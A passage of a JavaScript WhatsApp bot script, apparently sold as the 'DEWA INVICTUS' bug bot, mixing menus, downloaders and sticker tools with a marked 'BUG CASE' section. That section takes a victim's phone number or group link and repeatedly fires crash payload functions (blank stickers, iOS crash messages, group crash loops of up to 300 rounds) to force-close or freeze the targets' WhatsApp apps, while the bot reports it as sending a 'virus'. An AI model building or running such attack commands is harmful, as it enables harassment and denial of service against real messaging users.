─ᴄʀᴀsʜ ɪᴘʜᴏɴᴇ ɴᴏᴛ ᴀʟʟ ᴡᴏʀx
─ᴄʀᴀsʜ ɪᴘʜᴏɴᴇ + ɪɴᴠɪsɪʙʟᴇ

`
let buttons = [
        { buttonId: ".ownermenu", buttonText: { displayText: "𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮" } },
        { buttonId: ".sc", buttonText: { displayText: "𝐁𝐮𝐲 𝐒𝐜𝐫𝐢𝐩𝐭" } },
        { buttonId: ".menu", buttonText: { displayText: "𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮" } }
        
    ];

    let buttonMessage = {
        image: { url: `https://d.top4top.io/p_3645qplmv0.jpg` },      
        caption: menu, 
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦`,
                body: `pong available`,
                thumbnailUrl: `https://d.top4top.io/p_3645qplmv0.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦",  
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
    
    await sock.sendMessage(m.chat, buttonMessage, { quoted: PayX }); 
    } 
break
case 'ownermenu': {
await sock.sendMessage(m.chat, { react: { text: "💥",key: m.key,}}); 
let menu = `
*Yōkoso @${m.sender.split("@")[0]}, otetsudai sasete itadakimasu, 𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 Atarashii menyū o goyōi shimashita.*

*\`[ 𝐃𝐄𝐖𝐀 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐅𝐑𝐄𝐄 ]\`*
⎋ スクリプト名 : 𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦
⎋ リプ : 𝐅𝐑𝐄𝐄
⎋ 開発者 : 𝙂𝙪𝙥𝙤𝙣𝙜𝙎𝙝𝙤𝙥
⎋ バージョン : *Free*
⎋ リプト : *${runtime(process.uptime())}*

\`㲾\` 𝐋𝐢𝐬𝐭 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮 \`㲾\`
> .addmurbug
> .addowner
> .delmurbug
> .delmurbug
> .addcase
> .delcase
` 
let buttons = [
        { buttonId: ".sc", buttonText: { displayText: "𝐁𝐮𝐲 𝐒𝐜𝐫𝐢𝐩𝐭" } },
        { buttonId: ".menu", buttonText: { displayText: "𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮" } }
        
    ];

    let buttonMessage = {
        image: { url: `https://d.top4top.io/p_3645qplmv0.jpg` },      
        caption: menu, 
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦`,
                body: `pong available`,
                thumbnailUrl: `https://d.top4top.io/p_3645qplmv0.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦",  
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
    
    await sock.sendMessage(m.chat, buttonMessage, { quoted: PayX }); 
    } 
break
case 'tqto': {
await sock.sendMessage(m.chat, { react: { text: "💥",key: m.key,}}); 
let name = m.pushName || sock.getName(m.sender);
let panduan = `\`𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦\``

const url = `https://d.top4top.io/p_3645qplmv0.jpg`  //INI BAGIAN FOTO LU UBAH JDI URL MAKE BOT TOURL SAMA BAGIAN BAWAH ITU ADA KAN YANG IMAGE
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: sock.waUploadToServer
  });
  return imageMessage;
}
let msgiiii = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: panduan
          },
          carouselMessage: {
            cards: [
              {                   
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: `https://d.top4top.io/p_3645qplmv0.jpg` } }, { upload: sock.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: 'sock',
          hasMediaAttachment: false
        }),
                body: {
                  text: `『 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 』
 ➩ ɢᴜᴘᴏɴɢ ꜱʜᴏᴘ ｢ ᴅᴇᴠᴇʟᴏᴘᴇʀ ｣
 ➩ ᴀʟʟᴀʜ ꜱᴀᴡ ｢ ᴍʏ ɢᴏᴅ ｣
 ➩ xᴀᴛᴀ ｢ ᴘᴀʀᴛɴᴇʀ ｣`

                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦","url":"https://whatsapp.com/channel/0029Vb6ZxIJDOQIVKkA1up1e","merchant_url":"https://www.google.com"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    }
  },
  {}
);

await sock.relayMessage(msgiiii.key.remoteJid, msgiiii.message, {
  messageId: msgiiii.key.id,
});
}
break
case 'owner': case "dewaxs": {
await sock.sendMessage(m.chat, { react: { text: "💥",key: m.key,}}); 
let menu = `
*\`𝗖𝗿𝗲𝗮𝘁𝗼𝗿 𝗦𝗰𝗿𝗶𝗽𝘁\`*`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: `𝘽𝙀𝙍𝘽𝘼𝙂𝘼𝙄 𝘽𝘼𝙎𝙀 𝘼𝙉𝘿 𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋🚀`,
 newsletterJid: "120363403224294305@newsletter",
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: sock.decodeJid(sock.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦"
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: foto }, { upload: sock.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝙂𝙪𝙥𝙤𝙣𝙜𝙎𝙝𝙤𝙥\",\"url\":\"https://wa.me/6287732756731\",\"merchant_url\":\"https://wa.me/6287732756731\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝐏𝐨𝐧𝐠\",\"url\":\"https://wa.me/6285641406372\",\"merchant_url\":\"https://wa.me/6285641406372\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝗦𝗮𝗹𝘂𝗿𝗮𝗻\",\"url\":\"https://whatsapp.com/channel/0029Vb6ZxIJDOQIVKkA1up1e\",\"merchant_url\":\"https://wa.me/6287732756731\"}`
}],
 })
 })
 }
 }
}, {})

await sock.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break
case 'sc': {
let buy = `
*\`▧ 「 SCRIPT 𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 」\`*
╭────────────────━
┃友 *\`SCRIPT FREE\`*
┃
┃- *𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 FREE〽️*
┃
┃友 *Chat 𝐏𝐨𝐧𝐠 : https://wa.me/6287732756731*
┃友 *Telegram 𝐏𝐨𝐧𝐠 : https://t.me/GupongShop *
╰────────────────━`
sock.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 20000000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
}
break                 
case "info": {
let tobrut = `
𝐎𝐥𝐚𝐚
𝐒𝐜𝐫𝐢𝐩𝐭 𝐈𝐧𝐢 𝐝𝐢 𝐛𝐮𝐚𝐭 𝐨𝐥𝐞𝐡 𝐀𝐝𝐦𝐢𝐧 𝐓𝐞𝐫𝐭𝐚𝐦𝐩𝐚𝐧 🤭 @6287732756731, 𝐌𝐨 𝐉𝐨𝐢𝐧 𝐑𝐞𝐬𝐬/𝐏𝐭/𝐓𝐤 𝐩𝐦 𝐧𝐨 𝐏𝐨𝐧𝐠 𝐃𝐢 𝐚𝐭𝐚𝐬,
𝐁𝐞 𝐬𝐦𝐚𝐫𝐭 𝐁𝐮𝐲𝐞𝐫 𝐀𝐧𝐝 𝐒𝐞𝐥𝐥𝐞𝐫

𝐂𝐡 𝐮𝐭𝐚𝐦𝐚 𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦
https://whatsapp.com/channel/0029Vb6ZxIJDOQIVKkA1up1e
`
sock.sendText(m.chat, tobrut)
}
case 'funmenu': {
await sock.sendMessage(m.chat, { react: { text: "💥",key: m.key,}}); 
let menu = `
*Yōkoso @${m.sender.split("@")[0]}, otetsudai sasete itadakimasu, 𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 Atarashii menyū o goyōi shimashita.*

*\`[ 𝐃𝐄𝐖𝐀 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐅𝐑𝐄𝐄 ]\`*
⎋ スクリプト名 : 𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦
⎋ リプ : 𝟐.𝟎 𝐅𝐑𝐄𝐄
⎋ 開発者 : 𝙂𝙪𝙥𝙤𝙣𝙜𝙎𝙝𝙤𝙥
⎋ バージョン : *Free*
⎋ リプト : *${runtime(process.uptime())}*

\`㲾\` 𝐋𝐢𝐬𝐭 𝐅𝐮𝐧 𝐌𝐞𝐧𝐮 \`㲾\`
> .tiktok
> .cekkhodam
> .cekganteng
> .cekcantik
> .cekidch
> .tourl
> .swgroup
> .stiker
> .quotesgalau
> .quotesmotivasi
> .quotesbucin
` 
let buttons = [
        { buttonId: ".islami", buttonText: { displayText: "𝐈𝐬𝐥𝐚𝐦𝐢 𝐌𝐞𝐧𝐮" } },
        { buttonId: ".sc", buttonText: { displayText: "𝐁𝐮𝐲 𝐒𝐜𝐫𝐢𝐩𝐭" } },
        { buttonId: ".menu", buttonText: { displayText: "𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮" } }
        
    ];

    let buttonMessage = {
        image: { url: `https://d.top4top.io/p_3645qplmv0.jpg` },      
        caption: menu, 
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦`,
                body: `pong available`,
                thumbnailUrl: `https://d.top4top.io/p_3645qplmv0.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦",  
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
    
    await sock.sendMessage(m.chat, buttonMessage, { quoted: PayX }); 
    } 
break
case 'islami': {
await sock.sendMessage(m.chat, { react: { text: "☪️",key: m.key,}}); 
let menu = `
*مرحبًا، أنا بوت تاكيشي من إنتاج كورزا @${m.sender.split("@")[0]}, وأبيكس*

⎋ スクリプト名 : 𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦
⎋ リプ : 𝟐.𝟎 𝐅𝐑𝐄𝐄
⎋ 開発者 : 𝙂𝙪𝙥𝙤𝙣𝙜𝙎𝙝𝙤𝙥
⎋ バージョン : *Free*
⎋ リプト : *${runtime(process.uptime())}*

\`㲾\` *القائمة الإسلامية* \`㲾\`
> .kisahnabi
> .muslimai
> .doaharian
> .doatahlil
> .quotesmuslim
` 
let buttons = [
        { buttonId: ".sc", buttonText: { displayText: "𝐁𝐮𝐲 𝐒𝐜𝐫𝐢𝐩𝐭" } },
        { buttonId: ".menu", buttonText: { displayText: "𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮" } }
        
    ];

    let buttonMessage = {
        image: { url: `https://d.top4top.io/p_3645qplmv0.jpg` },      
        caption: menu, 
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦`,
                body: `pong available`,
                thumbnailUrl: `https://d.top4top.io/p_3645qplmv0.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦",  
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
    
    await sock.sendMessage(m.chat, buttonMessage, { quoted: PayX }); 
    } 
break
////// BUG CASE
case 'dewabug': {
if (!isPremium && !isOwner) return m.reply(mess.premium)
if (!q) return m.reply(`Penggunaan #${command} 628×××`)
let target = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
let teks = `𝘗𝘭𝘦𝘢𝘤𝘦 𝘚𝘦𝘭𝘦𝘤𝘵 𝘣𝘶𝘵𝘵𝘰𝘯 𝘛𝘰 𝘚??𝘯𝘥 𝘉𝘶𝘨 To ${target}`
sock.sendMessage(m.chat, {
  footer: `𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦`,
  buttons: [
    {
      buttonId: `.menu`,
      buttonText: { displayText: '𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
            name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'ʙᴜᴛᴛᴏɴs', 
          sections: [
            {
              title: 'ᴀʟʟ ʙᴜɢ ʙᴜᴛᴛᴏɴs',
              highlight_label: 'Force close',
              rows: [
                {
                  title: 'DELAY SPAM',
                  id: `.delay-spam ${target}`
                },
                {
                  title: '𝗫𝗵𝘀𝘂𝘁-𝒖𝒍𝒕𝒊𝒎𝒂𝒕𝒆',
                  id: `.dewa-rowr ${target}`
                },
                {
                  title: '𝗫𝗵𝘀𝘂𝘁-𝗘𝗻𝗴𝗶𝗻𝗲',
                  id: `.overide-forclose ${target}`
                },
                {
                  title: '𝐏𝐨𝐧𝐠-𝗻𝘂𝗹𝗹',
                  id: `.overide-imback ${target}`
                }
              ]
            }
          ]
        })
      }
     }
  ],
  headerType: 1,
  viewOnce: true,
      image: { url: 'https://d.top4top.io/p_3645qplmv0.jpg' },
      caption: teks,
      contextInfo: {
      externalAdReply: {
      title: '𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦',
      body: "pong available",
      thumbnailUrl: 'https://d.top4top.io/p_3645qplmv0.jpg',
      sourceUrl: ch,
      mediaType: 1,
      renderLargerThumbnail: false
      }
      }
      }, {
    quoted: PayX
          })
      }
break
case 'dewa-bebasspam': {
if (!isPremium && !isOwner) return m.reply(mess.premium)
if (!q) return m.reply(`Penggunaan #${command} 628×××`)
let target = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
let teks = `𝘗𝘭𝘦𝘢𝘤𝘦 𝘚𝘦𝘭𝘦𝘤𝘵 𝘣𝘶𝘵𝘵𝘰𝘯 𝘛𝘰 𝘚𝘦𝘯𝘥 𝘉𝘶𝘨 To ${target}`
sock.sendMessage(m.chat, {
  footer: `𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦`,
  buttons: [
    {
      buttonId: `.menu`,
      buttonText: { displayText: '𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗲𝗻𝘂' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
            name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'ʙᴜᴛᴛᴏɴs', 
          sections: [
            {
              title: 'ᴀʟʟ ʙᴜɢ ʙᴜᴛᴛᴏɴs',
              highlight_label: 'force close',
              rows: [
                {
                  title: '𝑫𝒓𝒆𝒂𝒅-𝖒𝖆𝖉𝖊',
                  id: `.overide-made ${target}`
                },
                {
                  title: '𝖌𝖑𝖔𝖜𝖒𝖆𝖓',
                  id: `.glowman ${target}`
                }
              ]
            }
          ]
        })
      }
     }
  ],
  headerType: 1,
  viewOnce: true,
      image: { url: 'https://d.top4top.io/p_3645qplmv0.jpg' },
      caption: teks,
      contextInfo: {
      externalAdReply: {
      title: '𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦',
      body: "pong available",
      thumbnailUrl: 'https://d.top4top.io/p_3645qplmv0.jpg',
      sourceUrl: ch,
      mediaType: 1,
      renderLargerThumbnail: false
      }
      }
      }, {
    quoted: PayX
          })
      }
break
case 'dewa-blank': {
    // Tambahkan pengecekan akses
if (!isPremium && !isOwner) return reply(mess.premium)        
    if (!q) 
       reply(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    sock.sendMessage(from, { 
        image: { url: `https://d.top4top.io/p_3645qplmv0.jpg` },
        caption: `𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐁𝐔𝐆 𝐓𝐎

𝘛𝘈𝘙𝘎𝘌𝘛 = ${pepec}
𝘛𝘠𝘗𝘌 = ${command}
𝘚𝘛𝘈𝘛𝘜𝘚 = 𝘚𝘶𝘤𝘤𝘦𝘴

𝑵𝑶𝑻𝑬𝑬!!!!! 
please pause 5-10 minutes to avoid blocking whatsapp account`
        
    }, { quoted: PayX });
    // Kirim bug ke target
    for (let i = 0; i < 5; i++) {
   await blankSticker(sock, target);
   await blankSticker(sock, target);
   await LocaCrashUi2(sock, target); 
   await kresjandaotax(sock, target);
   await oneMsg(target);
   await fuckgroupXnxx(sock, target);
   await sleep(5000);
  }
  }
break
case 'dewa-ipong': {
    // Tambahkan pengecekan akses
if (!isPremium && !isOwner) return reply(mess.premium)        
    if (!q) 
       reply(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    sock.sendMessage(from, { 
        image: { url: `https://d.top4top.io/p_3645qplmv0.jpg` },
        caption: `𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐁𝐔𝐆 𝐓𝐎

𝘛𝘈𝘙𝘎𝘌𝘛 = ${pepec}
𝘛𝘠𝘗𝘌 = ${command}
𝘚𝘛𝘈𝘛𝘜𝘚 = 𝘚𝘶𝘤𝘤𝘦𝘴

𝑵𝑶𝑻𝑬𝑬!!!!! 
please pause 5-10 minutes to avoid blocking whatsapp account`
        
    }, { quoted: PayX });
    // Kirim bug ke target
    for (let i = 0; i < 5; i++) {
                   await Xtended(sock, target);
                   await HyperSixty(target);
                   await IosVisibleExp(sock, target);
                   await trashInv(sock, target);
                   await sleep(5000)
  }
}
break
case 'delay-hard': {
    // Tambahkan pengecekan akses
if (!isPremium && !isOwner) return reply(mess.premium)        
    if (!q) 
       reply(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    sock.sendMessage(from, { 
        image: { url: `https://d.top4top.io/p_3645qplmv0.jpg` },
        caption: `𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐁𝐔𝐆 𝐓𝐎

𝘛𝘈𝘙𝘎𝘌𝘛 = ${pepec}
𝘛𝘠𝘗𝘌 = ${command}
𝘚𝘛𝘈𝘛𝘜𝘚 = 𝘚𝘶𝘤𝘤𝘦𝘴

𝑵𝑶𝑻𝑬𝑬!!!!! 
please pause 5-10 minutes to avoid blocking whatsapp account`
        
    }, { quoted: PayX });
    // Kirim bug ke target
    for (let i = 0; i < 5; i++) {
                   await TrueNull(sock, target);
                   await Gyxlores(target);
                   await vom2gsglx(sock, target);
                   await RFPSerxous(sock, target);
                   await xinvis3(sock, target);
                   await trashInv(sock, target);
                   await sleep(5000);
  }
}
break
case 'blankgb':
case 'killgb':
case 'buggb': {
   if (!m.isGroup) return reply('Khusus Bug Grup!!!')
   if (!isCreator) return reply(`*Can only be used in bot numbers*`)   
    reply(`*Ok*`)
    {    
    await BugGb1(m.chat);
    await BugGb12(m.chat);
    await BugGb1(m.chat);
    await BugGb12(m.chat);
    await BugGb1(m.chat);
    await BugGb12(m.chat);
    await BugGb1(m.chat);
    await BugGb12(m.chat);
    await BugGb1(m.chat);
    await BugGb12(m.chat);
    await BugGb1(m.chat);
    await BugGb12(m.chat);
    await BugGb1(m.chat);
    await BugGb12(m.chat);
    await BugGb1(m.chat);
    await BugGb12(m.chat);    
        }
    }
                break      
case 'delay-spam': {
    // Tambahkan pengecekan akses
    if (!isPremium && !isOwner) return reply(mess.premium)        
    if (!q) 
       reply(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    sock.sendMessage(from, { 
        image: { url: `https://d.top4top.io/p_3645qplmv0.jpg` },
        caption: `𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐁𝐔𝐆 𝐓𝐎

𝘛𝘈𝘙𝘎𝘌𝘛 = ${pepec}
𝘛𝘠𝘗𝘌 = ${command}
𝘚𝘛𝘈𝘛𝘜𝘚 = 𝘚𝘶𝘤𝘤𝘦𝘴

𝑵𝑶𝑻𝑬𝑬!!!!! 
please pause 5-10 minutes to avoid blocking whatsapp account
`,
        
    }, { quoted: PayX });
    // Kirim bug ke target
    for (let i = 0; i < 5; i++) {
await occolotopysV3(sock, target);
await glorymessage(target);
await invisibleSpam(sock, target);
await sleep(1500);
}
}
break
case 'killgc':
case 'fc-gc':
case 'hard-gc':
case 'crash-gb': {
    if (!isPremium && !isOwner) return reply(mess.premium);
    if (!text) return reply(`*Example:*\n${prefix + command} https:// Atau 9741@g.us`);
    
    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) return reply('invalid group link');

        try {
            let target = await sock.groupAcceptInvite(groupId);
            reply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink} (Group ID: ${groupId})`);

            for (let r = 0; r < 300; r++) {
            await crashGP(target)
            await sleep(5000)
            await crashGP(target)
           }
        } catch (err) {
            return reply(`Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.`);
        }

    } else {
        let target = groupLink;
        reply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink}`);

        for (let r = 0; r < 300; r++) {
            await crashGP(target)
            await sleep(5000)
            await crashGP(target)
        }
    }
}
break;
/////////// 𝘌𝘯𝘥 𝘉𝘶𝘨 𝘍𝘪𝘵𝘶𝘳𝘦𝘴
case 'tiktok':
 case 'tt': {
     if (args.length == 0) return reply(`Example: ${prefix + command} Masukan Link Tiktok Nya`)
     let q = m.quoted ? m.quoted : PayX
                sock.sendMessage(from, {
                    react: {
                        text: '🕐',
                        key: m.key
                    }
                });
     let res = await tiktok2(`${text}`)
    sock.sendMessage(m.chat, {
         video: {
             url: res.no_watermark
         },
         fileName: `tiktok.mp4`,
         mimetype: 'video/mp4'
     }).then(() => {

         sock.sendMessage(m.chat, {
             audio: {
                 url: res.music
             },
             fileName: `tiktok.mp3`,
             mimetype: 'audio/mp4'
         })
     })
 }
 break
           
           
           case "brat": {
    const text = q;
    if (!text) return reply(`*Cara Penggunaan* \n${prefix + command} Po`);
    reply(`𝗪𝗮𝗶𝘁...`);

    try {
        const encodedText = encodeURIComponent(text);
        const imageUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodedText}`;
        const inputPath = path.join(__dirname, "temp_image.jpg");
        const outputPath = path.join(__dirname, "sticker.webp");

        // Ambil gambar dari API
        const response = await axios.get(imageUrl, { responseType: "arraybuffer" });
        fs.writeFileSync(inputPath, response.data);

        // Konversi gambar ke stiker WebP
        exec(
            `ffmpeg -i ${inputPath} -vf "scale=512:512:force_original_aspect_ratio=decrease" -c:v libwebp -lossless 1 -q:v 80 -preset default -an -vsync 0 ${outputPath}`,
            async (error) => {
                if (error) {
                    console.error("Gagal mengonversi gambar:", error);
                    return await reply("Gagal membuat stiker");
                }

                // Kirim stiker
                await sock.sendMessage(
                    m.chat,
                    { sticker: fs.readFileSync(outputPath) },
                    { quoted: m }
                );

                // Hapus file sementara
                fs.unlinkSync(inputPath);
                fs.unlinkSync(outputPath);
            }
        );
    } catch (error) {
        console.error("Gagal membuat stiker:", error);
        await reply("Gagal membuat stiker");
    }
}
case "swgrup": {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await sock.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    reply("Udah Jing")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await sock.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    reply("Udah Jing")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await sock.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    reply("Udah Jing")
                } else if (caption) {
                    await sock.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    m.react("✅️")
                } else {
                    await reply(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
                }
            }
         
break
case "play": {
 if (!text) return reply("Masukkan judul lagu!\n\nContoh: .play Bertaut");

 try {
 const axios = require("axios");
 let api = `https://api.vreden.my.id/api/v1/download/play/audio?query=${encodeURIComponent(text)}`;
 let { data } = await axios.get(api);

 if (!data.status) return reply("Lagu tidak ditemukan!");

 let meta = data.result.metadata;
 let dl = data.result.download;

 let caption = `乂 *𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 PLAY*\n\n`;
 caption += `📌 *Judul:* ${meta.title}\n`;
 caption += `🎤 *Artis:* ${meta.author.name}\n`;
 caption += `⏱️ *Durasi:* ${meta.duration.timestamp}\n`;
 caption += `👀 *Views:* ${meta.views.toLocaleString()}\n`;
 caption += `📎 *Link:* ${meta.url}\n\n`;
 caption += `> 🎧 Audio sedang dikirim...`;

 await sock.sendMessage(m.chat, {
 image: { url: meta.thumbnail },
 caption: caption
 }, { quoted: m });

 await sock.sendMessage(m.chat, {
 audio: { url: dl.url },
 mimetype: "audio/mpeg",
 fileName: dl.filename
 }, { quoted: m });

 } catch (e) {
 console.error(e);
